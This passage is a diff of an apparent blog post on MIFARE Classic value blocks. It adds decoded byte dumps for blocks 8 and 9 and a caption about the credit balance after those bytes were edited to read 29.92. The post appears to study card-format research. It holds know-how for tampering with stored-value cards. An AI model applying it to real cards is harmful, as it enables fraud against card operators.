+      data02: RAW=4F F4 FF FF | INT_LE=4294964303 | INT_BE=1341456383 | NOT_LE=      2992 | NOT_BE=2953510912 | BIN=11111111111111111111010001001111 | BIN_NOT=00000000000000000000101110110000 | NOT_RAW=B0 0B 00 00
     !+08
-      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
-      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF
 
-[BLOCK] ID=9 S=2 B=1
-  [units=2]
-    data01: FULL=[B0 0B] | 00 00 | [4F F4] | FF FF | [B0 0B] | 00 00 | 09 F6 | 09 F6
-    data02: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
+[BLOCK] abs=09 (0x09) sec=2 blk=1
+  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
+  data02: [MIFARE VALUE] value=2992 adr=9 (0x09)
+  [units=4]
+    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
+    data02: FULL=[B0 0B 00 00] | [4F F4 FF FF] | [B0 0B 00 00] | 09 F6 09 F6
     !+00
-      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
-      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF
     !+04
-      data01: RAW=4F F4 | INT_LE=     62543 | INT_BE=     20468 | NOT_LE=      2992 | NOT_BE=     45067 | BIN=1111010001001111 | BIN_NOT=0000101110110000 | NOT_RAW=B0 0B
-      data02: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
+      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
+      data02: RAW=4F F4 FF FF | INT_LE=4294964303 | INT_BE=1341456383 | NOT_LE=      2992 | NOT_BE=2953510912 | BIN=11111111111111111111010001001111 | BIN_NOT=00000000000000000000101110110000 | NOT_RAW=B0 0B 00 00
     !+08
-      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
-      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF
+
 ```
 
 {% include figure.html path="assets/img/blog/2025-10-12/2992.png" class="img-fluid centered" zoomable=true caption="Credit value after editing bytes in blocks 8 and 9: 29.92" %}
@@ -636,7 +555,7 @@ operations the address remains unchanged. It can only be altered via a write com
 
 Figure 8. Value blocks
 
-```text
+```plaintext
 +-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
 | Byte Number | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 |
 +-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
@@ -654,7 +573,7 @@ The hexadecimal value of the address in the example is `11h`; `~adr` is `EEh`.
 
 Table 4. Value block format example
 
-```text
+```plaintext
 +-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
 | Byte Number | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 |
 +-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
